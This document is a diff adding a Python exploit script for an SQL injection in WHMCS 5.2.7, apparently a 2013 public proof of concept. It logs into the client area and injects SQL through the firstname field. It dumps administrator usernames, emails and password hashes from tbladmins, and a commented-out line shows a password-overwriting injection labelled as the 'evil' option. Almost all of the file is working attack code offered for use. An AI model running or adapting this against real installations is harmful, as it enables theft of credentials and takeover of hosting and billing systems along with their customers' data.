@@ -1,0 +1,35 @@
+#!/usr/bin/env python
+# 2013/10/03 - WHMCS 5.2.7 SQL Injection
+# http://localhost.re/p/whmcs-527-vulnerability
+
+url = 'http://clients.target.com/' # wopsie dopsie
+user_email = 'mysuper@hacker.account' # just create a dummie account at /register.php
+user_pwd = 'hacker' 
+
+import urllib, re, sys
+from urllib2 import Request, urlopen
+ua = "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.17 Safari/537.36"
+
+def exploit(sql):
+	print "Doing stuff: %s" % sql
+	r = urlopen(Request('%sclientarea.php?action=details' % url, data="token=%s&firstname=%s&lastname=1&companyname=1&email=%s&paymentmethod=none&billingcid=0&address1=1&address2=1&city=1&state=1&postcode=1&country=US&phonenumber=1&save=Save+Changes" % (user[1], 'AES_ENCRYPT(1,1), firstname=%s' % sql, user_email), headers={"User-agent": ua, "Cookie": user[0]})).read()
+	return re.search(r'(id="firstname" value="(.*?)")', r).group(2)
+
+def login():
+	print "Getting CSRF token"
+	r = urlopen(Request('%slogin.php' % url, headers={"User-agent": ua}))
+	csrf = re.search(r'(type="hidden" name="token" value="([0-9a-f]{40})")', r.read()).group(2)
+	cookie = r.info()['set-cookie'].split(';')[0]
+	print "Logging in"
+	r = urlopen(Request('%sdologin.php' % url, data="username=%s&password=%s&token=%s" %(user_email, user_pwd, csrf), headers={"User-agent": ua, "Cookie": cookie})).read()
+	if 'dologin.php' in r:
+		sys.exit('Unable to login')
+	else:
+		return [cookie, re.search(r'(type="hidden" name="token" value="([0-9a-f]{40})")', r).group(2)]
+
+user = login()
+print exploit('(SELECT GROUP_CONCAT(id,0x3a,username,0x3a,email,0x3a,password SEPARATOR 0x2c20) FROM tbladmins)') # get admins
+print exploit('(SELECT * FROM (SELECT COUNT(id) FROM tblclients) as x)') # just get a count of clients
+
+# oh you want to be evil
+#exploit("'DISASTER', password=(SELECT * FROM (SELECT password FROM tblclients WHERE email='%s' LIMIT 1) as x)#" % user_email)
